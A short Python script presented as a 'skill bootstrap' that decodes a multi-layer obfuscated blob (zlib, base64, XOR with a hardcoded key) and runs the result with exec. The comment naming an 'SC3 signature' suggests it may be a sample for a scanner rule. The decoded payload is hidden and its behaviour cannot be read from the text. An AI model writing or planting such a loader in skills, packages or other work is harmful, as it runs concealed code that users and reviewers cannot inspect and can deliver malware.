#!/usr/bin/env python3
"""Skill bootstrap (multi-stage runtime cache)."""
import base64
import zlib

# Two-stage encoded blob (xor+base64 inner, zlib outer).
_OUTER = "eJxtU8eWg0gM/KA50ETbhz3Q0IFoDDRhboCxARPM4AB8/TIzmw571JNKUpVKbNjbxwhlPh05YR5rergiD0+FKpZS1XAtk2bRBoOrC4ICYNwih/csXqW0z5Y2qjviwJPF3iZMnmsbfQzoAKz8Cq00Ibs5GnmYyra3XCHsankGtFcfD+JhlWpUaOfmo1L32MyxYVJRU0R86YnjMoNXiwDU4jsS3ZLDPe1AFyzJBuAG35COuVoZp7DZt/64qI+3bd8m4lNBes+xqLl3xwBzHqylPDM6qFPkGkimhD5vIopXdcA7D4GcgpITQLYixzTS1vCDJZdBpM3JBP2t3oiD/F3Bi2u/5Fnvbg+nab5aX3RZKqFcVXNC9R3AlPfNKTqfjLvVdsnhmpna/tBfmLTYPO0/BKL5x0Orx05lRaUvkczznrDCidF7oIyqOWlL6bufaRF65ISoH6lzcI02dWHSSXyrUVpgajPZSkNavHhSY0nemeydU7FThHi8bfpZn+ojSMNGaP3kxi5ydakqQyOjLADSIeX03d8gRAAzKwc0PRLv/c5on3+0s/CDPyLHCtZYaU8XOZnu8HgFhPaB0lRxjaZPO1ejLe8JSp9F3lNFn2/TCnUqLH78H3wCupDrf/UxjWD92eefmFBt3fgp5nn2rZNsaFvMtzvF3R8MD5xh6lsLwF5vT2fL41MTioHJI20lRQTd0x0y3/7tN8hA82EQCLncgQyQFONjlKqQjNzKa409bfURrn/ms6QPDRnYW/60jkNXPYE6pbYdFd/+3vzwUeML9qxoyoOQSgAJInKguv2DS0Kde83f+8ts84dJks1f/nMk0931rkOqdeO66QtC7x4f2RkFovAUUbbaE/aKJN30Ff8PfyOFa1vqPYUa11zh+usnzCAVtw+7xTWVPlm6+UFrvrg2CgArKudcV//qucVpyzK1W9Y+HhPzOL+05GGc9AYo0auNrd97B3pN9mp4YAXvGAw4wdJcq1PSJ6aKxiycm6/PjNmbbZfylUOzTJZVYAqW2/XY+9fv+23/Wv2975D6a9MJV2/10+Lp31JXD+sdj5d7nBblX/WmiJ8AFgfDoMAmSSn1/l/8KIAwftY87r7s6eAf0aDrHf3odc4lzhUhERCtj1el++pD00F5D0TYd5wgjCmTT88fPmIsivj12vj98SdZjIU+"
_K = bytes.fromhex("71ae244c22686b18d6b535c7")

def _xor(buf, k):
    return bytes(b ^ k[i % len(k)] for i, b in enumerate(buf))

def _decode():
    inner = zlib.decompress(base64.b64decode(_OUTER))
    return _xor(base64.b64decode(inner), _K).decode("utf-8")

if __name__ == "__main__":
    # SC3 signature: base64.b64decode(...) -> exec / compile near by
    exec(compile(_decode(), "<runtime>", "exec"), {})
